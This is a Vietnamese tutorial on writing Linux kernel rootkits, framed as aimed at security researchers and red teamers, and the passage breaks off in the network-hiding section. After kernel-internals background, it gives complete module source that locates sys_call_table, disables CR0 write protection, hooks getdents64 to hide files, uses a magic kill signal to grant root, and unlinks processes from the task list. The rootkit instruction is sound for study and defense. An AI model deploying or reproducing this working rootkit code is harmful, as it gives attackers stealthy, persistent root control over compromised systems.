# Linux Kernel Rootkit — Từ Zero đến Advanced

> **Mục đích**: Tài liệu này dành cho security researcher, malware analyst, red teamer, và những ai muốn hiểu sâu về cách rootkit kernel Linux hoạt động — để phòng thủ tốt hơn, phân tích mẫu malware thực tế, hoặc phát triển khả năng offensive security trong phạm vi được ủy quyền.

---

## Mục lục

- [Phần 0: Mindset & Lộ trình tổng quan](#phần-0-mindset--lộ-trình-tổng-quan)
- [Phần 1: Nền tảng bắt buộc](#phần-1-nền-tảng-bắt-buộc)
- [Phần 2: Linux Kernel Internals](#phần-2-linux-kernel-internals)
- [Phần 3: Loadable Kernel Module (LKM) — Cánh cửa vào kernel](#phần-3-loadable-kernel-module-lkm--cánh-cửa-vào-kernel)
- [Phần 4: Kỹ thuật Rootkit cốt lõi](#phần-4-kỹ-thuật-rootkit-cốt-lõi)
- [Phần 5: Kỹ thuật nâng cao](#phần-5-kỹ-thuật-nâng-cao)
- [Phần 6: Anti-forensics & Persistence](#phần-6-anti-forensics--persistence)
- [Phần 7: Rootkit thực tế đáng nghiên cứu](#phần-7-rootkit-thực-tế-đáng-nghiên-cứu)
- [Phần 8: APT và rootkit — Học từ thực chiến](#phần-8-apt-và-rootkit--học-từ-thực-chiến)
- [Phần 9: Detection & Defense — Mặt đối lập](#phần-9-detection--defense--mặt-đối-lập)
- [Phần 10: Lab Setup & Môi trường thực hành](#phần-10-lab-setup--môi-trường-thực-hành)
- [Phần 11: Tài nguyên học tập](#phần-11-tài-nguyên-học-tập)
- [Phần 12: Lộ trình chi tiết theo tuần](#phần-12-lộ-trình-chi-tiết-theo-tuần)

---

## Phần 0: Mindset & Lộ trình tổng quan

### Bức tranh toàn cảnh

```
Userland (Ring 3)          Kernel (Ring 0)              Hardware/Firmware
┌──────────────────┐      ┌──────────────────────┐     ┌──────────────────┐
│ LD_PRELOAD hook  │      │ Syscall table hook   │     │ SMM rootkit      │
│ ptrace injection │      │ VFS hook             │     │ UEFI bootkit     │
│ /proc,/sys fake  │  →   │ Netfilter hook       │  →  │ BMC/IPMI implant │
│ GOT/PLT hijack   │      │ kprobe/ftrace abuse  │     │ NIC firmware     │
│                  │      │ Direct kernel object │     │ GPU DMA attack   │
│                  │      │   manipulation (DKOM)│     │                  │
└──────────────────┘      └──────────────────────┘     └──────────────────┘
      Dễ nhất                   Trung tâm guide             Khó nhất
      Dễ detect                 này tập trung               Nation-state
```

### Tại sao phải học từ kernel?

1. **Ring 0 = God mode**: Toàn quyền trên hệ thống, bypass mọi security userland
2. **Invisible by design**: Kernel code chạy trước mọi security tool
3. **APT reality**: Hầu hết implant APT cao cấp đều ở kernel level
4. **Defense requires offense knowledge**: Không hiểu cách attack thì không thể detect

### Lộ trình 4 giai đoạn

```
Giai đoạn 1 (1-2 tháng): Nền tảng
  → C programming, OS concepts, kernel basics, viết LKM đầu tiên

Giai đoạn 2 (2-3 tháng): Core Techniques  
  → Syscall hooking, process/file hiding, network hiding

Giai đoạn 3 (2-3 tháng): Advanced
  → DKOM, ftrace abuse, eBPF rootkit, anti-detection

Giai đoạn 4 (ongoing): Research & Innovation
  → Nghiên cứu APT samples, phát triển kỹ thuật mới, contribute detection rules
```

---

## Phần 1: Nền tảng bắt buộc

### 1.1 C Programming — Không có shortcut

Rootkit kernel = pure C. Không có stdlib, không có printf, không có malloc thông thường. Bạn phải thật vững C.

**Phải nắm vững:**

| Chủ đề | Tại sao cần | Ví dụ trong rootkit |
|--------|-------------|---------------------|
| Pointer & pointer arithmetic | Mọi thứ trong kernel là pointer | Dereference syscall table entries |
| Function pointer | Hook = thay function pointer | `original_read = sys_call_table[__NR_read]` |
| Struct & struct embedding | Kernel dùng struct everywhere | `task_struct`, `file_operations`, `list_head` |
| Bitwise operations | Flag manipulation, permission check | `current->flags \|= PF_INVISIBLE` |
| Inline assembly | Bypass compiler, direct CPU control | `mov cr0, rax` để tắt write protection |
| Macro & preprocessor | Kernel API dùng macro rất nhiều | `MODULE_LICENSE`, `module_init` |
| Volatile & memory barriers | Prevent compiler optimization trên shared data | Đọc/ghi kernel memory an toàn |
| typeof, container_of | Navigate kernel data structures | Lấy parent struct từ embedded member |

**Sách recommended:**
- *"The C Programming Language"* — K&R (classic, đọc lại nếu lâu không dùng)
- *"Expert C Programming: Deep C Secrets"* — Peter van der Linden
- *"21st Century C"* — Ben Klemens

**Bài tập tự kiểm tra:**
```c
// Nếu bạn không hiểu đoạn này làm gì, cần ôn lại C
#define container_of(ptr, type, member) ({          \
    const typeof(((type *)0)->member) *__mptr = (ptr); \
    (type *)((char *)__mptr - offsetof(type, member)); })

struct my_list {
    struct list_head list;
    int data;
};

// Từ &entry->list, lấy lại struct my_list *entry
struct my_list *item = container_of(pos, struct my_list, list);
```

### 1.2 x86-64 Assembly cơ bản

Không cần viết assembly nhiều, nhưng phải **đọc được** vì:
- Debug kernel = đọc disassembly
- Một số kỹ thuật hook cần inline asm
- Hiểu calling convention để hook syscall đúng

**Calling convention trên x86-64 Linux (System V ABI):**
```
Arguments: rdi, rsi, rdx, rcx, r8, r9 (rồi mới đến stack)
Return:    rax
Callee-saved: rbx, rbp, r12-r15
Syscall:   rax = syscall number, args: rdi, rsi, rdx, r10, r8, r9
           Return in rax, rcx và r11 bị clobber
```

**Instructions cần biết:**
```nasm
; Control registers (quan trọng cho rootkit)
mov rax, cr0        ; Đọc CR0 — chứa WP bit
and rax, ~0x10000   ; Clear WP bit (Write Protect)
mov cr0, rax        ; Tắt write protection → ghi vào read-only pages

; Interrupt control
cli                 ; Clear Interrupt Flag — tắt interrupts
sti                 ; Set Interrupt Flag — bật lại

; MSR access (Model Specific Registers)
rdmsr               ; Đọc MSR[ecx] → edx:eax
wrmsr               ; Ghi edx:eax → MSR[ecx]
; MSR 0xC0000082 = IA32_LSTAR = syscall entry point
```

**Tài nguyên:**
- *"x86-64 Assembly Language Programming with Ubuntu"* — Ed Jorgensen (free PDF)
- Intel SDM Volume 2 (Instruction Set Reference) — reference, không cần đọc hết

### 1.3 Operating System Concepts

**Phải hiểu trước khi đụng kernel:**

```
┌─────────────────────────────────────────────────────┐
│                   Process Management                 │
│  - Process vs Thread                                │
│  - Process states (TASK_RUNNING, TASK_INTERRUPTIBLE)│
│  - Scheduling: CFS, preemption                      │
│  - Process creation: fork/clone → exec              │
│  - Signal handling                                  │
│  - Namespaces & cgroups (container context)          │
├─────────────────────────────────────────────────────┤
│                   Memory Management                  │
│  - Virtual memory & page tables                     │
│  - Kernel space vs User space                       │
│  - Paging: 4-level (PML4) trên x86-64              │
│  - Slab allocator (kmalloc, kmem_cache)             │
│  - copy_from_user / copy_to_user                    │
│  - mmap, brk                                        │
├─────────────────────────────────────────────────────┤
│                   File Systems                       │
│  - VFS layer                                        │
│  - Inode, dentry, superblock                        │
│  - File operations struct                           │
│  - procfs, sysfs, debugfs                           │
├─────────────────────────────────────────────────────┤
│                   Networking                         │
│  - Socket layer                                     │
│  - Netfilter framework                              │
│  - sk_buff structure                                │
│  - TCP/IP stack trong kernel                         │
├─────────────────────────────────────────────────────┤
│                   System Calls                       │
│  - Syscall mechanism (SYSCALL instruction)           │
│  - Syscall table                                    │
│  - Transition user → kernel space                   │
│  - VDSO (Virtual Dynamic Shared Object)             │
└─────────────────────────────────────────────────────┘
```

**Sách:**
- *"Operating System Concepts"* — Silberschatz (Dinosaur book) — nền tảng
- *"Operating Systems: Three Easy Pieces"* (OSTEP) — free online, cực kỳ tốt
- *"Modern Operating Systems"* — Tanenbaum

### 1.4 Linux System Programming

Trước khi vào kernel, phải thành thạo interact với kernel từ userspace:

```bash
# Những syscall phải hiểu rõ vì rootkit hay hook chúng:
strace ls -la          # Xem mọi syscall mà ls gọi
strace -e trace=open,read,write,close cat /etc/passwd
strace -e trace=network curl example.com
strace -f -e trace=process bash -c 'ls | grep foo'

# Các syscall quan trọng nhất:
# - open/openat, read, write, close     → File access
# - getdents/getdents64                 → Directory listing (ls dùng cái này)
# - execve/execveat                     → Process execution  
# - connect, accept, bind, sendto, recvfrom → Network
# - kill, tkill                          → Signal
# - stat, lstat, fstat                   → File metadata
# - ioctl                               → Device control
# - mmap, mprotect                       → Memory
# - clone, fork                          → Process creation
```

**Sách:** *"The Linux Programming Interface"* — Michael Kerrisk (bible of Linux syscalls)

---

## Phần 2: Linux Kernel Internals

### 2.1 Kernel Architecture

```
User Space
═══════════════════════════════════════════════════════════
Kernel Space
┌─────────────────────────────────────────────────────────┐
│                    System Call Interface                  │
├──────────┬──────────┬──────────┬──────────┬─────────────┤
│ Process  │ Memory   │ File     │ Network  │ Device      │
│ Mgmt     │ Mgmt     │ Systems  │ Stack    │ Drivers     │
│          │          │          │          │             │
│task_struct│ mm_struct│  VFS     │ socket   │ char/block  │
│scheduler │page table│ inode    │ sk_buff  │ input       │
│ signals  │ slab     │ dentry   │netfilter │ USB, PCI    │
│ ptrace   │ vmalloc  │ ext4,xfs │ TCP/IP   │ DMA         │
├──────────┴──────────┴──────────┴──────────┴─────────────┤
│              Architecture-Dependent Code                 │
│         (arch/x86, arch/arm64, ...)                     │
├─────────────────────────────────────────────────────────┤
│                    Hardware Abstraction                   │
└─────────────────────────────────────────────────────────┘
```

### 2.2 Kernel Data Structures quan trọng

#### `task_struct` — Trái tim của process management

```c
// include/linux/sched.h — struct quan trọng nhất
struct task_struct {
    // --- Identification ---
    pid_t                   pid;          // Process ID
    pid_t                   tgid;         // Thread Group ID
    char                    comm[TASK_COMM_LEN]; // Process name

    // --- State ---
    unsigned int            __state;      // TASK_RUNNING, TASK_INTERRUPTIBLE, etc.
    unsigned int            flags;        // PF_EXITING, PF_KTHREAD, etc.

    // --- Credentials (quan trọng cho privilege) ---
    const struct cred       *real_cred;   // Objective credentials
    const struct cred       *cred;        // Effective credentials
    // cred->uid, cred->euid, cred->cap_effective, etc.

    // --- Memory ---
    struct mm_struct        *mm;          // Memory descriptor (NULL cho kernel thread)
    struct mm_struct        *active_mm;

    // --- File system ---
    struct fs_struct        *fs;          // Filesystem info (root, pwd)
    struct files_struct     *files;       // Open file descriptors

    // --- Linked list cho process tree ---
    struct list_head        tasks;        // All tasks list
    struct task_struct      *parent;      // Parent process
    struct list_head        children;     // Children list
    struct list_head        sibling;      // Sibling list

    // --- Namespace (container awareness) ---
    struct nsproxy          *nsproxy;     // Namespaces

    // --- Scheduling ---
    int                     prio;
    const struct sched_class *sched_class;
    struct sched_entity     se;

    // ... còn rất nhiều fields khác (~700 dòng)
};

// Macro để lấy current task
// current luôn trỏ đến task_struct của process đang chạy
struct task_struct *curr = current;
printk("Current process: %s (PID %d)\n", curr->comm, curr->pid);
```

**Tại sao rootkit care?**
- Ẩn process = xóa entry khỏi `tasks` linked list
- Escalate privilege = sửa `cred` struct
- Detect environment = kiểm tra `nsproxy` (có đang trong container không?)

#### `list_head` — Linux Kernel Linked List

```c
// Kernel dùng intrusive linked list — list node nằm TRONG struct, không wrap struct
struct list_head {
    struct list_head *next, *prev;
};

// API:
list_add(&new->list, &head);              // Thêm vào đầu
list_add_tail(&new->list, &head);         // Thêm vào cuối
list_del(&entry->list);                   // Xóa khỏi list (DKOM dùng cái này)
list_del_init(&entry->list);              // Xóa và reinit

// Duyệt list:
struct task_struct *task;
list_for_each_entry(task, &init_task.tasks, tasks) {
    printk("PID: %d, Name: %s\n", task->pid, task->comm);
}

// "An toàn" khi xóa element trong khi duyệt:
struct task_struct *task, *tmp;
list_for_each_entry_safe(task, tmp, &init_task.tasks, tasks) {
    if (should_hide(task)) {
        list_del(&task->tasks);  // DKOM: process biến mất khỏi /proc
    }
}
```

#### `file_operations` — VFS Hook Point

```c
// Mỗi file/device trong kernel có một bộ operations
struct file_operations {
    struct module *owner;
    loff_t (*llseek)(struct file *, loff_t, int);
    ssize_t (*read)(struct file *, char __user *, size_t, loff_t *);
    ssize_t (*write)(struct file *, const char __user *, size_t, loff_t *);
    int (*iterate_shared)(struct file *, struct dir_context *);  // readdir
    __poll_t (*poll)(struct file *, struct poll_table_struct *);
    long (*unlocked_ioctl)(struct file *, unsigned int, unsigned long);
    int (*mmap)(struct file *, struct vm_area_struct *);
    int (*open)(struct inode *, struct file *);
    int (*release)(struct inode *, struct file *);
    // ... nhiều hơn
};

// Rootkit hook iterate_shared để ẩn file:
// /proc dùng file_operations → hook iterate_shared của /proc
// → filter kết quả → process ẩn không xuất hiện khi ls /proc
```

### 2.3 Kernel Memory Layout (x86-64)

```
Virtual Address Space Layout (x86-64, 5-level paging disabled):

0x0000000000000000 ┌─────────────────────────┐
                   │                         │
                   │     User Space           │
                   │     (128 TB)             │
                   │                         │
0x00007FFFFFFFFFFF ├─────────────────────────┤
                   │   Non-canonical hole     │
                   │   (huge gap)             │
0xFFFF800000000000 ├─────────────────────────┤
                   │   Guard hole             │
0xFFFF880000000000 ├─────────────────────────┤  ← trước kernel 4.15
0xFFFF888000000000 ├─────────────────────────┤  ← sau KASLR/KPTI changes
                   │   Direct mapping of      │
                   │   all physical memory     │  ← page_offset_base
                   │   (physmap)              │
                   ├─────────────────────────┤
                   │   vmalloc/ioremap area   │  ← vmalloc_base
                   ├─────────────────────────┤
                   │   vmemmap (struct page    │
                   │   array)                 │
                   ├─────────────────────────┤
0xFFFFFFFF80000000 │   Kernel text mapping    │  ← __START_KERNEL_map
                   │   (kernel code, data,     │
                   │    bss, modules)          │
0xFFFFFFFFC0000000 ├─────────────────────────┤
                   │   Modules space           │  ← MODULES_VADDR
0xFFFFFFFFFFFFFFFF └─────────────────────────┘

Quan trọng cho rootkit:
- KASLR randomize: kernel text base, physmap base, vmalloc base
- Để tìm syscall table, cần bypass KASLR
- Direct mapping cho phép access mọi physical memory
- Module space là nơi LKM rootkit sống
```

### 2.4 System Call Flow

```
Userspace: read(fd, buf, count)
    │
    │  libc wrapper: mov rax, 0 (SYS_read)
    │                syscall instruction
    │
    ▼
CPU: SYSCALL instruction
    │
    │  1. Swap RSP → kernel stack (MSR_KERNEL_GS_BASE)
    │  2. Save user RIP → RCX, RFLAGS → R11
    │  3. Load RIP from MSR_LSTAR (IA32_LSTAR = 0xC0000082)
    │
    ▼
entry_SYSCALL_64 (arch/x86/entry/entry_64.S)
    │
    │  1. swapgs — swap GS base (user ↔ kernel per-CPU data)
    │  2. Save registers vào pt_regs trên kernel stack
    │  3. Lookup: sys_call_table[rax]
    │  4. Call handler: ksys_read(fd, buf, count)
    │
    ▼
ksys_read() → vfs_read() → file->f_op->read()
    │
    │  Thực hiện I/O
    │
    ▼
Return path:
    │  1. Restore registers từ pt_regs
    │  2. swapgs
    │  3. SYSRET (hoặc IRET nếu cần)
    │
    ▼
Userspace: return value in rax

═══════════════════════════════════════
Rootkit hook points trong flow này:
  A. Thay entry trong sys_call_table         (classic)
  B. Patch entry_SYSCALL_64                  (inline hook)
  C. Modify MSR_LSTAR                        (MSR hook)
  D. Hook file->f_op->read                   (VFS hook)
  E. Dùng kprobes/ftrace trên ksys_read      (tracing abuse)
```

### 2.5 Kernel Security Mechanisms (phải bypass/deal with)

| Cơ chế | Mô tả | Impact lên rootkit |
|--------|--------|-------------------|
| **KASLR** | Kernel Address Space Layout Randomization — randomize base address | Phải tìm sym dynamically, không hardcode address |
| **SMEP** | Supervisor Mode Execution Prevention — kernel không execute user pages | Không thể redirect kernel code sang user pages |
| **SMAP** | Supervisor Mode Access Prevention — kernel không access user pages | copy_from_user/copy_to_user bắt buộc |
| **KPTI** | Kernel Page Table Isolation (Meltdown mitigation) — tách page table | Kernel/user page table riêng, thêm overhead cho hook |
| **CR0.WP** | Write Protection bit — read-only pages enforce | Phải clear WP để ghi vào syscall table |
| **CONFIG_STRICT_KERNEL_RWX** | Kernel text marked read-only + non-executable data | Không patch trực tiếp kernel text dễ dàng |
| **Module signature** | `CONFIG_MODULE_SIG_FORCE` — chỉ load signed modules | Cần bypass hoặc dùng technique khác (kprobes, eBPF) |
| **Lockdown LSM** | Hạn chế kernel modification ngay cả với root | Block nhiều technique rootkit trên kernel mới |
| **SELinux/AppArmor** | Mandatory Access Control | Có thể cản trở rootkit load, nhưng rootkit ở Ring 0 có thể disable |
| **seccomp** | Syscall filtering | Userland only, không ảnh hưởng kernel rootkit |
| **CFI** | Control Flow Integrity | Forward-edge: chặn indirect call abuse. Khó hơn cho function pointer hook |

---

## Phần 3: Loadable Kernel Module (LKM) — Cánh cửa vào kernel

### 3.1 LKM cơ bản nhất

```c
// hello.c — LKM đầu tiên
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("researcher");
MODULE_DESCRIPTION("Hello World LKM");

static int __init hello_init(void)
{
    printk(KERN_INFO "Hello from kernel!\n");
    // printk output xem bằng: dmesg | tail
    return 0;  // 0 = success, non-zero = fail → module không load
}

static void __exit hello_exit(void)
{
    printk(KERN_INFO "Goodbye from kernel!\n");
}

module_init(hello_init);
module_exit(hello_exit);
```

```makefile
# Makefile
obj-m += hello.o

KDIR := /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean
```

```bash
# Build & test
make
sudo insmod hello.ko       # Load module
lsmod | grep hello          # Verify loaded
dmesg | tail                # Xem kernel log
sudo rmmod hello            # Unload module
```

### 3.2 Interact với proc filesystem

```c
// proc_example.c — Tạo /proc entry (backdoor command channel phổ biến)
#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

#define PROC_NAME "myinfo"
#define BUFSIZE 256

static char msg[BUFSIZE];
static int msg_len;

static ssize_t proc_read(struct file *file, char __user *buf,
                          size_t count, loff_t *pos)
{
    return simple_read_from_buffer(buf, count, pos, msg, msg_len);
}

static ssize_t proc_write(struct file *file, const char __user *buf,
                           size_t count, loff_t *pos)
{
    if (count >= BUFSIZE)
        return -EINVAL;

    if (copy_from_user(msg, buf, count))
        return -EFAULT;

    msg_len = count;
    msg[msg_len] = '\0';
    return count;
}

static const struct proc_ops proc_fops = {
    .proc_read  = proc_read,
    .proc_write = proc_write,
};

static struct proc_dir_entry *proc_entry;

static int __init proc_init(void)
{
    proc_entry = proc_create(PROC_NAME, 0666, NULL, &proc_fops);
    if (!proc_entry)
        return -ENOMEM;
    printk(KERN_INFO "/proc/%s created\n", PROC_NAME);
    return 0;
}

static void __exit proc_exit(void)
{
    proc_remove(proc_entry);
    printk(KERN_INFO "/proc/%s removed\n", PROC_NAME);
}

module_init(proc_init);
module_exit(proc_exit);
```

### 3.3 Character device — Một cách khác để communicate

```c
// chardev.c — tạo /dev/mydevice
#include <linux/init.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

static dev_t dev_num;
static struct cdev my_cdev;
static struct class *my_class;

static int dev_open(struct inode *inode, struct file *file) { return 0; }
static int dev_release(struct inode *inode, struct file *file) { return 0; }

static ssize_t dev_read(struct file *file, char __user *buf,
                         size_t count, loff_t *offset)
{
    char *secret = "rootkit data here\n";
    size_t len = strlen(secret);

    if (*offset >= len) return 0;
    if (copy_to_user(buf, secret + *offset, min(count, len - (size_t)*offset)))
        return -EFAULT;
    *offset += min(count, len - (size_t)*offset);
    return min(count, len);
}

static const struct file_operations fops = {
    .owner   = THIS_MODULE,
    .open    = dev_open,
    .read    = dev_read,
    .release = dev_release,
};

static int __init chardev_init(void)
{
    alloc_chrdev_region(&dev_num, 0, 1, "mydevice");
    cdev_init(&my_cdev, &fops);
    cdev_add(&my_cdev, dev_num, 1);
    my_class = class_create("mydevice");
    device_create(my_class, NULL, dev_num, NULL, "mydevice");
    return 0;
}

static void __exit chardev_exit(void)
{
    device_destroy(my_class, dev_num);
    class_destroy(my_class);
    cdev_del(&my_cdev);
    unregister_chrdev_region(dev_num, 1);
}

module_init(chardev_init);
module_exit(chardev_exit);
```

### 3.4 Kernel API quan trọng cho rootkit

```c
// === Memory Allocation ===
void *kmalloc(size_t size, gfp_t flags);        // Tương tự malloc
void kfree(void *ptr);                           // Tương tự free
void *kzalloc(size_t size, gfp_t flags);         // kmalloc + memset 0
void *vmalloc(size_t size);                      // Cho allocation lớn, non-contiguous
// flags: GFP_KERNEL (may sleep), GFP_ATOMIC (không sleep, dùng trong interrupt)

// === String Operations ===
// KHÔNG có stdlib → dùng kernel equivalent
#include <linux/string.h>
// strlen, strcmp, strncmp, strcpy, strncpy, memcpy, memset, memmove

// === Printing ===
printk(KERN_INFO "format %s %d\n", str, num);
pr_info("same as KERN_INFO\n");
pr_err("error message\n");
pr_debug("debug — chỉ hiện khi CONFIG_DYNAMIC_DEBUG\n");

// === Synchronization ===
#include <linux/spinlock.h>
spinlock_t lock;
spin_lock_init(&lock);
spin_lock(&lock);        // Busy-wait lock
spin_unlock(&lock);

#include <linux/mutex.h>
struct mutex my_mutex;
mutex_init(&my_mutex);
mutex_lock(&my_mutex);   // Sleeping lock — KHÔNG dùng trong atomic context
mutex_unlock(&my_mutex);

#include <linux/rwlock.h>
rwlock_t rw;
read_lock(&rw);          // Nhiều reader đồng thời
write_lock(&rw);         // Exclusive writer

// === Kernel Symbol Lookup ===
#include <linux/kallsyms.h>
unsigned long addr = kallsyms_lookup_name("sys_call_table");
// ⚠️ Bị unexport từ kernel 5.7+ → cần tìm cách khác

// === Timer / Delayed Work ===
#include <linux/timer.h>
#include <linux/workqueue.h>
// Dùng cho periodic tasks (beacon, data exfil timer, etc.)

// === User/Kernel Copy ===
#include <linux/uaccess.h>
copy_from_user(kernel_buf, user_buf, len);  // User → Kernel
copy_to_user(user_buf, kernel_buf, len);    // Kernel → User
// PHẢI check return value — failure = security bug
```

---

## Phần 4: Kỹ thuật Rootkit cốt lõi

### 4.1 Tìm sys_call_table — Bước đầu tiên

`sys_call_table` là mảng function pointer — mỗi entry là một syscall handler. Tìm được nó = hook được mọi syscall.

```c
// === Phương pháp 1: kallsyms_lookup_name (kernel < 5.7) ===
unsigned long *sys_call_table;
sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

// === Phương pháp 2: Kprobes trick (kernel >= 5.7) ===
// kallsyms_lookup_name bị unexport, nhưng kprobes vẫn dùng nó internally
#include <linux/kprobes.h>

static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = { .symbol_name = name };
    unsigned long addr;

    if (register_kprobe(&kp) < 0)
        return 0;
    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

// Sử dụng:
sys_call_table = (unsigned long *)lookup_name("sys_call_table");

// === Phương pháp 3: Scan MSR_LSTAR ===
// MSR_LSTAR chứa entry_SYSCALL_64, từ đó scan pattern tìm syscall table
static unsigned long *find_syscall_table_from_msr(void)
{
    unsigned long msr_val;
    unsigned char *ptr;
    unsigned long *table;

    rdmsrl(MSR_LSTAR, msr_val);  // Đọc syscall entry point
    ptr = (unsigned char *)msr_val;

    // Scan for: call *sys_call_table(, %rax, 8)
    // Opcode pattern: ff 14 c5 [4-byte address]
    for (int i = 0; i < 512; i++) {
        if (ptr[i] == 0xff && ptr[i+1] == 0x14 && ptr[i+2] == 0xc5) {
            table = (unsigned long *)
                ((unsigned long)(*(int *)(ptr + i + 3)) | 0xFFFFFFFF00000000UL);
            return table;
        }
    }
    return NULL;
}

// === Phương pháp 4: /proc/kallsyms parse từ userland ===
// Helper script gửi address vào kernel module qua ioctl hoặc proc
// grep sys_call_table /proc/kallsyms  (cần root, kptr_restrict=0)

// === Phương pháp 5: IDT scan ===
// Từ IDT table → tìm interrupt handler → trace tới syscall table
```

### 4.2 Syscall Table Hooking — Technique cổ điển

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>
#include <asm/paravirt.h>

MODULE_LICENSE("GPL");

// Function pointer types cho syscall handlers
typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);

static orig_getdents64_t orig_getdents64;
static orig_kill_t orig_kill;
static unsigned long *__sys_call_table;

// === CR0 Write Protection toggle ===
// Syscall table nằm trong read-only memory → phải tắt WP

static inline void cr0_write(unsigned long val)
{
    asm volatile("mov %0, %%cr0" : : "r"(val) : "memory");
}

static void disable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    cr0_write(cr0 & ~0x00010000);  // Clear bit 16 (WP)
}

static void enable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    cr0_write(cr0 | 0x00010000);   // Set bit 16 (WP)
}

// Cách hiện đại hơn: dùng set_memory_rw / set_memory_ro
// hoặc poke_memory / text_poke cho kernel text

// === Hook getdents64 — Ẩn file/process ===
#define HIDDEN_PREFIX "rootkit_"

static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (void *)regs->si;
    long ret = orig_getdents64(regs);
    struct linux_dirent64 *current_dir, *previous_dir, *dirent_ker = NULL;
    unsigned long offset = 0;

    if (ret <= 0)
        return ret;

    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker)
        return ret;

    if (copy_from_user(dirent_ker, dirent, ret)) {
        kfree(dirent_ker);
        return ret;
    }

    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;

        // Ẩn entry có prefix "rootkit_"
        if (strncmp(current_dir->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0) {

            // Nếu là entry đầu tiên
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir,
                        (void *)current_dir + current_dir->d_reclen,
                        ret);
                continue;
            }
            // Entry ở giữa hoặc cuối: mở rộng entry trước
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    copy_to_user(dirent, dirent_ker, ret);
    kfree(dirent_ker);
    return ret;
}

// === Hook kill — Magic signal cho backdoor ===
#define MAGIC_SIGNAL 64

static asmlinkage long hooked_kill(const struct pt_regs *regs)
{
    int sig = (int)regs->si;
    pid_t pid = (pid_t)regs->di;

    if (sig == MAGIC_SIGNAL) {
        // Nhận được magic signal → thực hiện action
        // Ví dụ: give root, hide process, etc.
        printk(KERN_INFO "Magic signal received for PID %d\n", pid);

        // Escalate current process to root
        struct cred *new_cred = prepare_creds();
        if (new_cred) {
            new_cred->uid.val = 0;
            new_cred->gid.val = 0;
            new_cred->euid.val = 0;
            new_cred->egid.val = 0;
            new_cred->suid.val = 0;
            new_cred->sgid.val = 0;
            commit_creds(new_cred);
        }
        return 0;
    }
    return orig_kill(regs);
}

// === Install / Remove hooks ===
static int __init rootkit_init(void)
{
    __sys_call_table = (unsigned long *)lookup_name("sys_call_table");
    if (!__sys_call_table) {
        pr_err("Failed to find sys_call_table\n");
        return -EFAULT;
    }

    // Save originals
    orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];

    // Install hooks
    disable_write_protection();
    __sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
    enable_write_protection();

    pr_info("Rootkit loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    disable_write_protection();
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    enable_write_protection();

    pr_info("Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

### 4.3 Process Hiding

```c
// === Method 1: Hook getdents64 (đã demo ở trên) ===
// Ẩn /proc/PID entries → ps, top, htop không thấy

// === Method 2: DKOM — Xóa khỏi task list ===
// Trực tiếp unlink task_struct khỏi linked list

static void hide_process(pid_t pid)
{
    struct task_struct *task;

    // Tìm task by PID
    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (!task) {
        rcu_read_unlock();
        return;
    }

    // Xóa khỏi task list (DKOM)
    list_del_init(&task->tasks);

    // Process vẫn chạy — scheduler vẫn schedule nó
    // Nhưng /proc không liệt kê, ps không thấy
    // CẢNH BÁO: có thể gây crash nếu kernel iterate task list

    rcu_read_unlock();
}

// === Method 3: Modify /proc readdir ===
// Hook iterate_shared của /proc directory operations

static int (*orig_proc_iterate)(struct file *, struct dir_context *);

static int hooked_proc_filldir(struct dir_context *ctx,
                                const char *name, int namlen,
                                loff_t offset, u64 ino,
                                unsigned int d_type)
{
    // Nếu tên là PID cần ẩn, skip
    long pid;
    if (kstrtol(name, 10, &pid) == 0 && pid == hidden_pid)
        return 0;  // Không gọi original filldir → entry bị bỏ qua

    return orig_filldir(ctx, name, namlen, offset, ino, d_type);
}
```

### 4.4 File Hiding

```c
// === Method 1: Hook getdents64 (đã demo) ===
// Filter theo filename prefix, suffix, hoặc inode

// === Method 2: VFS layer hook ===
// Hook lookup operation của parent directory

// Ví dụ: ẩn file trong một directory cụ thể
static struct dentry *(*orig_lookup)(struct inode *, struct dentry *,
                                      unsigned int);

static struct dentry *hooked_lookup(struct inode *dir,
                                     struct dentry *dentry,
                                     unsigned int flags)
{
    if (strstr(dentry->d_name.name, "hidden_file"))
        return ERR_PTR(-ENOENT);  // Giả vờ file không tồn tại

    return orig_lookup(dir, dentry, flags);
}

// Hook vào inode_operations của target directory
// target_inode->i_op = &hooked_inode_ops;

// === Method 3: Modify dentry cache ===
// Remove dentry từ dcache → file invisible cho lookup
// Nhưng direct access (nếu biết path) vẫn có thể work
```

### 4.5 Network Hiding

```c
// === Method 1: Hook /proc/net/tcp, /proc/net/udp ===
// netstat, ss đọc từ đây

// Cách hoạt động của /proc/net/tcp:
